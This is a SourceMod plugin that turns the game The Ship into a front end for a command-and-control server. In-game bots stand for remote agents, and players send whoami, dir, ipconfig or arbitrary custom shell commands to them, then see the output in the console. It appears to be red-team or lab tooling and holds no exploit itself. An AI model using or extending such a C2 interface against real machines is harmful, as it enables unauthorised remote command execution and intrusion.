#include <sourcemod>
#include <sdktools>
#include <socket>

// --- Configuration ---
#define C2_IP "10.0.1.5"
#define C2_PORT 8000
#define LISTEN_PORT 8001

ConVar g_cvBotQuota;
ConVar g_cvEnableBots;

Handle g_hListenSocket = INVALID_HANDLE;
int g_AwaitingCustomCmd[MAXPLAYERS + 1] = { -1, ... };
float g_LastMenuTime[MAXPLAYERS + 1] = { 0.0, ... };

// Dictionary to store the whoami results for each agent
StringMap g_AgentUsers;

public Plugin myinfo = {
	name = "The Ship C2 Bridge",
	author = "xp101t",
	description = "Bi-directional TCP bridge and UI controller for C2 integration.",
	version = "1.0"
};

public void OnPluginStart()
{
	g_cvBotQuota = FindConVar("bot_quota");
	g_cvEnableBots = FindConVar("ship_enable_bots");
	
	g_AgentUsers = new StringMap();
	
	RegAdminCmd("sm_add_beacon", Command_AddBeacon, ADMFLAG_ROOT);
	RegConsoleCmd("person_talk", Command_PersonTalk);
	
	AddCommandListener(Listener_InterceptChat, "say");
	AddCommandListener(Listener_InterceptChat, "say_team");
	
	g_hListenSocket = SocketCreate(SOCKET_TCP, OnInboundSocketError);
	if (g_hListenSocket != INVALID_HANDLE) 
	{
		SocketBind(g_hListenSocket, "0.0.0.0", LISTEN_PORT);
		SocketListen(g_hListenSocket, OnInboundSocketIncoming);
		PrintToServer("[C2 Listener] Listening on port %d...", LISTEN_PORT);
	}
}

// --- Outbound TCP (To C2) ---

void SendTaskToC2(const char[] target, const char[] command)
{
	Handle dp = CreateDataPack();
	WritePackString(dp, target);
	WritePackString(dp, command);
	
	Handle socket = SocketCreate(SOCKET_TCP, OnOutboundSocketError);
	SocketSetArg(socket, dp);
	
	SocketConnect(socket, OnOutboundSocketConnected, OnOutboundSocketReceive, OnOutboundSocketDisconnected, C2_IP, C2_PORT);
}

public int OnOutboundSocketConnected(Handle socket, any arg)
{
	Handle dp = view_as<Handle>(arg);
	ResetPack(dp);
	char target[64], command[256];
	ReadPackString(dp, target, sizeof(target));
	ReadPackString(dp, command, sizeof(command));
	CloseHandle(dp);
	
	ReplaceString(command, sizeof(command), "\\", "\\\\");
	ReplaceString(command, sizeof(command), "\"", "\\\"");
	
	char jsonBody[512];
	Format(jsonBody, sizeof(jsonBody), "{\"target_id\":\"%s\",\"command\":\"%s\"}", target, command);
	
	char request[1024];
	Format(request, sizeof(request), "POST /game/task HTTP/1.0\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s", C2_IP, strlen(jsonBody), jsonBody);
	
	SocketSend(socket, request);
}

public int OnOutboundSocketReceive(Handle socket, char[] receiveData, const int dataSize, any arg)
{
	// Silent drop to keep game console clean
}

public int OnOutboundSocketDisconnected(Handle socket, any arg)
{
	CloseHandle(socket);
}

public int OnOutboundSocketError(Handle socket, const int errorType, const int errorNum, any arg)
{
	PrintToServer("[C2 Outbound] Error: %d, Code: %d", errorType, errorNum);
	Handle dp = view_as<Handle>(arg);
	if (dp != INVALID_HANDLE) CloseHandle(dp); 
	CloseHandle(socket);
}

// --- Inbound TCP (From C2) ---

public int OnInboundSocketIncoming(Handle socket, Handle newSocket, const char[] remoteIP, int remotePort, any arg)
{
	SocketSetReceiveCallback(newSocket, OnInboundSocketReceive);
	SocketSetDisconnectCallback(newSocket, OnInboundSocketDisconnect);
	SocketSetErrorCallback(newSocket, OnInboundSocketError);
}

public int OnInboundSocketReceive(Handle socket, char[] receiveData, const int dataSize, any arg)
{
	if (strncmp(receiveData, "SPAWN:", 6) == 0) 
	{
		char targetName[64];
		strcopy(targetName, sizeof(targetName), receiveData[6]); 
		ReplaceString(targetName, sizeof(targetName), "\r", "");
		ReplaceString(targetName, sizeof(targetName), "\n", "");
		
		SpawnBeacon(targetName);
	}
	else if (strncmp(receiveData, "RESULT:", 7) == 0)
	{
		char payload[4096];
		strcopy(payload, sizeof(payload), receiveData[7]);
		
		int pipeIdx = FindCharInString(payload, '|');
		if (pipeIdx != -1) 
		{
			char agentId[64];
			strcopy(agentId, pipeIdx + 1, payload); 
			
			char remainder[4096];
			strcopy(remainder, sizeof(remainder), payload[pipeIdx + 1]); 
			
			char command[256];
			char output[4096];
			
			int newlineIdx = FindCharInString(remainder, '\n');
			if (newlineIdx != -1) {
				strcopy(command, newlineIdx + 1, remainder);
				
				int outStart = newlineIdx + 1;
				if (remainder[outStart] == '\n') outStart++; // Step over Python's double newline
				
				strcopy(output, sizeof(output), remainder[outStart]);
			} else {
				strcopy(command, sizeof(command), "unknown");
				strcopy(output, sizeof(output), remainder);
			}
			
			TrimString(command);
			TrimString(output);
			
			// Auto-register the username if this was a whoami payload
			if (StrEqual(command, "whoami", false)) {
				g_AgentUsers.SetString(agentId, output);
			}
			
			char shellUser[128];
			if (!g_AgentUsers.GetString(agentId, shellUser, sizeof(shellUser))) {
				strcopy(shellUser, sizeof(shellUser), "unknown");
			}
			
			for (int i = 1; i <= MaxClients; i++) 
			{
				if (IsClientInGame(i) && !IsFakeClient(i)) 
				{
					PrintToChat(i, "\x04[C2 Shell]\x01 Results from \x03%s@%s\x01. Check console (~).", shellUser, agentId);
					
					PrintToConsole(i, "\n==================================================");
					PrintToConsole(i, " C2 RESULTS -> %s@%s", shellUser, agentId);
					PrintToConsole(i, "==================================================");
					PrintToConsole(i, "%s", output);
					PrintToConsole(i, "==================================================\n");
				}
			}
		}
	}
}

public int OnInboundSocketDisconnect(Handle socket, any arg)
{
	CloseHandle(socket);
}

public int OnInboundSocketError(Handle socket, const int errorType, const int errorNum, any arg)
{
	PrintToServer("[C2 Inbound] Error: %d, Code: %d", errorType, errorNum);
	CloseHandle(socket);
}

// --- Spawner Logic ---

int GetHumanCount()
{
	int humanCount = 0;
	for (int i = 1; i <= MaxClients; i++) {
		if (IsClientInGame(i) && !IsFakeClient(i)) {
			humanCount++;
		}
	}
	return humanCount;
}

public Action Command_AddBeacon(int client, int args)
{
	if (args < 1) return Plugin_Handled;

	char targetName[64];
	GetCmdArg(1, targetName, sizeof(targetName));
	SpawnBeacon(targetName);

	return Plugin_Handled;
}

void SpawnBeacon(const char[] targetName)
{
	if (GetHumanCount() == 0) {
		PrintToServer("[C2] Spawn failed: No human players connected.");
		return;
	}

	int current = g_cvBotQuota.IntValue;
	if (current == 0) g_cvEnableBots.SetInt(1);
	g_cvBotQuota.SetInt(current + 1);

	DataPack pack;
	CreateDataTimer(2.0, Timer_ApplyName, pack);
	pack.WriteString(targetName);
}

public Action Timer_ApplyName(Handle timer, DataPack pack)
{
	pack.Reset();
	char targetName[64];
	pack.ReadString(targetName, sizeof(targetName));

	int newestBot = -1;
	int highestUserId = -1;

	for (int i = 1; i <= MaxClients; i++) {
		if (IsClientInGame(i) && IsFakeClient(i)) {
			int uid = GetClientUserId(i);
			if (uid > highestUserId) {
				highestUserId = uid;
				newestBot = i;
			}
		}
	}

	if (newestBot != -1) {
		SetClientInfo(newestBot, targetName, "anything");
		PrintToServer("[C2] Beacon deployed: '%s'", targetName);
		
		// Immediately fire an autonomous whoami task back to C2
		SendTaskToC2(targetName, "whoami");
	}
}

// --- Interaction & UI ---

public Action Command_PersonTalk(int client, int args)
{
	if (GetEngineTime() - g_LastMenuTime[client] < 1.0) return Plugin_Handled; 
	g_LastMenuTime[client] = GetEngineTime();

	int target = GetClientAimTarget(client, false);
	
	if (target > 0 && target <= MaxClients && IsClientInGame(target) && IsFakeClient(target)) 
	{
		CancelClientMenu(client);
		
		char botName[64];
		GetClientInfo(target, "name", botName, sizeof(botName)); 
		
		char shellUser[128];
		if (!g_AgentUsers.GetString(botName, shellUser, sizeof(shellUser))) {
			strcopy(shellUser, sizeof(shellUser), "unknown");
		}
		
		Menu beaconMenu = new Menu(MenuHandler_BeaconChoice);
		beaconMenu.SetTitle("=== C2 SHELL: %s@%s ===\nChoose Payload:", shellUser, botName);
		
		char idStr[16];
		IntToString(target, idStr, sizeof(idStr));

		char val1[64], val2[64], val3[64], valCustom[64];
		Format(val1, sizeof(val1), "%d|whoami", target);
		Format(val2, sizeof(val2), "%d|dir", target);
		Format(val3, sizeof(val3), "%d|ipconfig", target);
		Format(valCustom, sizeof(valCustom), "%d|CUSTOM", target);

		beaconMenu.AddItem(val1, "Execute 'whoami'");
		beaconMenu.AddItem(val2, "Execute 'dir'");
		beaconMenu.AddItem(val3, "Execute 'ipconfig'");
		beaconMenu.AddItem(valCustom, "Custom Payload");
		
		beaconMenu.Display(client, MENU_TIME_FOREVER);
		PrintHintText(client, "TARGET: %s\n>>> PRESS ESC TO OPEN MENU <<<", botName);
		CreateTimer(3.0, Timer_ClearPopup, GetClientUserId(client));
		
		return Plugin_Handled;
	}
	return Plugin_Continue;
}

public Action Timer_ClearPopup(Handle timer, int userid)
{
	int client = GetClientOfUserId(userid);
	if (client > 0 && IsClientInGame(client)) PrintHintText(client, " "); 
}

public int MenuHandler_BeaconChoice(Menu menu, MenuAction action, int client, int param2)
{
	if (action == MenuAction_Select) 
	{
		PrintHintText(client, " ");
		char itemVal[64];
		menu.GetItem(param2, itemVal, sizeof(itemVal));

		char parts[2][32];
		ExplodeString(itemVal, "|", parts, 2, 32);
		
		int targetID = StringToInt(parts[0]);
		char payload[32];
		strcopy(payload, sizeof(payload), parts[1]);

		char botName[64];
		GetClientInfo(targetID, "name", botName, sizeof(botName));
		
		char shellUser[128];
		if (!g_AgentUsers.GetString(botName, shellUser, sizeof(shellUser))) {
			strcopy(shellUser, sizeof(shellUser), "unknown");
		}

		if (StrEqual(payload, "CUSTOM", false)) 
		{
			g_AwaitingCustomCmd[client] = targetID;
			PrintToChat(client, "\x04[C2 Shell]\x01 Target: \x03%s\x01. Close ESC and type command in chat.", botName);
		}
		else 
		{
			PrintToChat(client, "\x04[C2 Shell]\x01 %s@%s:~$ %s", shellUser, botName, payload);
			SendTaskToC2(botName, payload);
		}
	}
	else if (action == MenuAction_End) {
		delete menu;
	}
	return 0;
}

public Action Listener_InterceptChat(int client, const char[] command, int argc)
{
	if (client > 0 && g_AwaitingCustomCmd[client] != -1) 
	{
		int targetID = g_AwaitingCustomCmd[client];
		char payload[256];
		
		// Use GetCmdArg(1) to avoid Source Engine's raw string formatting ghost issues
		GetCmdArg(1, payload, sizeof(payload));
		
		// Strip party/team prefixes forced by The Ship UI
		if (strncmp(payload, "/p ", 3) == 0) {
			strcopy(payload, sizeof(payload), payload[3]);
		} else if (strncmp(payload, "/t ", 3) == 0) {
			strcopy(payload, sizeof(payload), payload[3]);
		}
		
		TrimString(payload);
		
		if (StrEqual(payload, "exit", false) || StrEqual(payload, "cancel", false)) {
			g_AwaitingCustomCmd[client] = -1;
			PrintToChat(client, "\x04[C2 Shell]\x01 Custom command cancelled.");
			return Plugin_Handled; 
		}
		
		char botName[64];
		GetClientInfo(targetID, "name", botName, sizeof(botName));
		
		char shellUser[128];
		if (!g_AgentUsers.GetString(botName, shellUser, sizeof(shellUser))) {
			strcopy(shellUser, sizeof(shellUser), "unknown");
		}
		
		PrintToChat(client, "\x04[C2 Shell]\x01 %s@%s:~$ %s", shellUser, botName, payload);
		SendTaskToC2(botName, payload);
		
		g_AwaitingCustomCmd[client] = -1;
		return Plugin_Handled; 
	}
	return Plugin_Continue;
}